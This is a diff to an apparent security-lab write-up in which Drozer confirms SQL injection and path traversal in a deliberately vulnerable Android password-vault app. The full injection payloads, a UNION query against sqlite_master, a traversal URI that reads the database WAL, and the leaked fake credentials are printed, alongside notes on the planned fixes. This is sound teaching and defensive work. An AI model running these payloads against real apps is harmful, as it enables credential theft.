@@ -206,9 +206,75 @@ Row: 2 id=1, site=room_master_table, username=CREATE TABLE room_master_table (id
 Row: 3 id=1, site=sqlite_sequence, username=CREATE TABLE sqlite_sequence(name,seq), password=x
 ```
 
+### Independent corroboration with Drozer (ReversecLabs fork, v3.1.0)
+
+Set up: client installed with `pipx install drozer`, `drozer-agent.apk` (release 3.1.0) installed on the emulator, Embedded Server enabled, `adb forward tcp:31415 tcp:31415` + `drozer console connect`.
+
+```
+dz> run app.package.attacksurface dev.guillermomartin.vaultkeeper
+Attack Surface:
+  2 activities exported
+  1 broadcast receivers exported
+  1 content providers exported
+  0 services exported
+    is debuggable
+
+dz> run app.provider.info -a dev.guillermomartin.vaultkeeper
+Package: dev.guillermomartin.vaultkeeper
+  Authority: dev.guillermomartin.vaultkeeper.provider
+    Read Permission: null
+    Write Permission: null
+    Content Provider: dev.guillermomartin.vaultkeeper.data.provider.VaultContentProvider
+    Multiprocess Allowed: False
+    Grant Uri Permissions: False
+```
+
+**Unplanned finding — automated discovery misses the vulnerable path.** Both `scanner.provider.finduris -a dev.guillermomartin.vaultkeeper` (dynamic probing) and `app.provider.finduri dev.guillermomartin.vaultkeeper` (static, despite its description — "Find referenced content URIs in a package" — suggesting DEX string analysis) only returned the bare authorities declared in the manifest:
+
+```
+content://dev.guillermomartin.vaultkeeper.provider
+content://dev.guillermomartin.vaultkeeper.provider/
+content://dev.guillermomartin.vaultkeeper.androidx-startup
+content://dev.guillermomartin.vaultkeeper.androidx-startup/
+```
+
+(the `androidx-startup` authority is injected by the `androidx.startup` library itself, not application code). Neither module tried the `/credentials` sub-path — our `UriMatcher` only recognizes `credentials` and `favicons/*`, so both bare-authority URIs hit the `else -> throw IllegalArgumentException(...)` branch and are reported as unreachable. Consequently, `scanner.provider.injection -a dev.guillermomartin.vaultkeeper` — which only attacks the URIs the previous scan found — reported:
+
+```
+Not Vulnerable:
+  content://dev.guillermomartin.vaultkeeper.provider/
+  content://dev.guillermomartin.vaultkeeper.provider
+  content://dev.guillermomartin.vaultkeeper.androidx-startup
+  content://dev.guillermomartin.vaultkeeper.androidx-startup/
+
+Injection in Projection:
+  No vulnerabilities found.
+Injection in Selection:
+  No vulnerabilities found.
+```
+
+This is a false negative, not evidence the injection doesn't exist — the scanner attacked the wrong URI. Neither of these drozer modules decompiles the APK for embedded `content://.../credentials` string literals; both appear to only reflect `<provider android:authorities="...">` declarations from the manifest. A real attacker relying solely on drozer's automated discovery (no source access, no manual reverse-engineering with a tool like `jadx`) would not find this endpoint — which reinforces the project's own narrative that `VaultRaider` has no legitimate relationship with `VaultKeeper` and no access to its source.
+
+With the real path supplied manually (the same role `VaultRaider`/`adb shell content query` already played), both v0.2 attacks reproduce identically through a third, independent tool:
+
+```
+dz> run app.provider.query content://dev.guillermomartin.vaultkeeper.provider/credentials --selection "site = 'nope.invalid' OR '1'='1'"
+| id | site         | username               | password                     |
+| 1  | example.test | demo@example.test      | Tr0ub4dor&3-fake             |
+| 2  | mail.example | demo.mail@example.test | Hunter2-fake                 |
+| 3  | shop.example | demo.shop@example.test | Cassette-Battery-Staple-fake |
+
+dz> run app.provider.query content://dev.guillermomartin.vaultkeeper.provider/credentials --selection "0=1 UNION SELECT 1, name, sql, 'x' FROM sqlite_master WHERE type='table'"
+| id | site              | username                                                                                                                                               | password |
+| 1  | android_metadata  | CREATE TABLE android_metadata (locale TEXT)                                                                                                            | x        |
+| 1  | credentials       | CREATE TABLE `credentials` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `site` TEXT NOT NULL, `username` TEXT NOT NULL, `password` TEXT NOT NULL) | x        |
+| 1  | room_master_table | CREATE TABLE room_master_table (id INTEGER PRIMARY KEY,identity_hash TEXT)                                                                             | x        |
+| 1  | sqlite_sequence   | CREATE TABLE sqlite_sequence(name,seq)                                                                                                                 | x        |
+```
+
 ### v0.2 closed
 
-The SQL injection vulnerability (vuln #1) is proven with real, reproducible output from `VaultRaider` itself, not just ad-hoc tooling. `sortOrder` is built with the exact same string-concatenation pattern and is equally injectable, even though this stage didn't exercise it through the UI (`VaultRaider` only exposes a `selection` field) — it stays in scope for the fix. v0.3 fixes this by parametrizing `selection`/`selectionArgs` through `SimpleSQLiteQuery`'s bind-argument form and validating `sortOrder`/`projection` against an explicit column allowlist.
+The SQL injection vulnerability (vuln #1) is proven with real, reproducible output from `VaultRaider` itself, not just ad-hoc tooling, and independently corroborated with Drozer against the historical v0.2 commit (`655cac0`, checked out read-only for this purpose, then returned to `main` without altering history). `sortOrder` is built with the exact same string-concatenation pattern and is equally injectable, even though this stage didn't exercise it through the UI (`VaultRaider` only exposes a `selection` field) — it stays in scope for the fix. v0.3 fixes this by parametrizing `selection`/`selectionArgs` through `SimpleSQLiteQuery`'s bind-argument form and validating `sortOrder`/`projection` against an explicit column allowlist.
 
 ## v0.3 — Fixing the SQL injection (vuln #1)
 
@@ -343,9 +409,37 @@ java.io.FileNotFoundException: open failed: ENOENT (No such file or directory)
 
 Fails, even though the target file genuinely exists (`adb shell run-as dev.guillermomartin.vaultraider ls files/` confirms `profileInstalled` is there) and the relative-path arithmetic is correct. The file read still happens as `VaultKeeper`'s own process/UID (`openFile()` runs inside the provider's host app, not the caller's), so the kernel's DAC permissions plus SELinux's per-app category isolation (distinct `c235,...` vs. `c236,...` contexts, also visible in the `id` output above) block the cross-UID read before the path is ever resolved. This confirms the architecture diagram's premise directly: the app-level path-traversal bug lets `VaultRaider` escape the *intended favicons-only scope* inside `VaultKeeper`'s own sandbox, but it cannot escape the OS-level UID/SELinux sandbox itself to reach a different app's files — that boundary isn't "what this project questions," and it holds.
 
+### Independent corroboration with Drozer
+
+Same setup as v0.2 (see above), now against the v0.4 historical commit (`ccbb797`, checked out read-only, `VaultKeeper` rebuilt/reinstalled, then returned to `main` without altering history).
+
+`scanner.provider.traversal -a dev.guillermomartin.vaultkeeper` hits the same discovery false negative documented in v0.2 — it only probes the bare authority (which isn't a valid `favicons/*` match), so it reports:
+
+```
+Not Vulnerable:
+  content://dev.guillermomartin.vaultkeeper.provider/
+  content://dev.guillermomartin.vaultkeeper.provider
+  content://dev.guillermomartin.vaultkeeper.androidx-startup
+  content://dev.guillermomartin.vaultkeeper.androidx-startup/
+
+Vulnerable Providers:
+  No vulnerable providers found.
+```
+
+With the real `favicons/..%2F..%2Fdatabases%2Fvault.db-wal` URI supplied manually, `app.provider.read` reproduces the full plaintext leak directly in the console — the raw bytes dump includes the readable credential strings inline with the binary WAL content:
+
+```
+dz> run app.provider.read content://dev.guillermomartin.vaultkeeper.provider/favicons/..%2F..%2Fdatabases%2Fvault.db-wal
+W--ctableandroid_metadata...CREATE TABLE android_metadata (locale TEXT)...
+...%9Eshop.exampledemo.shop@example.testCassette-Battery-Staple-fake3%9%mail.exampledemo.mail@example.testHunt...
+...#credentialsexample.testdemo@example.testTr0ub4dor&3-fake...
+```
+
+**Unplanned finding — `app.provider.download` is incompatible with this `openFile()`.** The equivalent download module (`app.provider.download content://.../favicons/..%2F..%2Fdatabases%2Fvault.db-wal <local-path>`), which should stream the same bytes to a local file for offline analysis, hung indefinitely and ultimately killed the drozer agent process on the device (`TimeoutError`, session lost, agent had to be restarted). `app.provider.read` against the exact same URI worked without issue immediately before. Whatever `download` does differently internally (likely a different `ContentResolver` open call or a read-loop assumption that doesn't hold for a plain file served through a real `ParcelFileDescriptor.open()`), it isn't required for the exploit to be proven — `read`'s output already contains the leaked plaintext — so this wasn't investigated further.
+
 ### v0.4 closed
 
-Vuln #2 is proven with a real, reproducible plaintext credential leak (`vault.db-wal`) read through `openFile()`, confirmed both via `adb` and via `VaultRaider`'s own UI, and scoped with a real negative test showing the traversal is bounded by the OS sandbox even though the app-level check is completely absent. v0.5 fixes this by resolving the requested file's canonical path and rejecting anything that falls outside `faviconsDir`'s canonical path.
+Vuln #2 is proven with a real, reproducible plaintext credential leak (`vault.db-wal`) read through `openFile()`, confirmed via `adb`, via `VaultRaider`'s own UI, and independently via Drozer, and scoped with a real negative test showing the traversal is bounded by the OS sandbox even though the app-level check is completely absent. v0.5 fixes this by resolving the requested file's canonical path and rejecting anything that falls outside `faviconsDir`'s canonical path.
 
 ## v0.5 — Fixing the path traversal (vuln #2)
 
